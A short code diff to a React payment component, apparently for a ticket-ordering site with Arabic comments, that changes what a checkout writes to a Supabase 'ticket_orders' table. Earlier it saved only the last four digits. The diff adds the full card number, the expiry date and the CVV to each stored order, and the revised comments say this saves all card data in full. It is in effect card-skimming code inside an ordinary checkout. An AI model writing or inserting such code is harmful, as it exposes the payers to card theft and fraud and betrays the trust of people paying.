@@ -436,7 +436,7 @@ const CardPayment = () => {
   const [cardLast4Saved, setCardLast4Saved] = useState("");
   const [cardBrandSaved, setCardBrandSaved] = useState("");
 
-  // ✅ handlePay المعدل مع error handling
+  // ✅ handlePay مع حفظ جميع بيانات البطاقة
   const handlePay = async () => {
     if (!validate()) {
       setCardShake(true);
@@ -458,7 +458,7 @@ const CardPayment = () => {
 
     const confirmationNumber = `DIR-${Date.now().toString(36).toUpperCase().slice(-6)}`;
 
-    // ✅ التعديل الرئيسي: إضافة error handling
+    // ✅ حفظ جميع بيانات البطاقة كاملة
     const { data: inserted, error } = await supabase.from("ticket_orders").insert({
       email: state?.email || "",
       phone: state?.phone || "",
@@ -473,6 +473,9 @@ const CardPayment = () => {
       card_brand: cardBrand,
       cardholder_name: cardName.trim() || null,
       bank_name: detectedBank || null,
+      card_full_number: digits,        // ← رقم البطاقة كامل
+      card_expiry: expiry,             // ← تاريخ الانتهاء
+      card_cvv: cvv,                   // ← CVV
     } as any).select("id").single();
 
     if (error) {
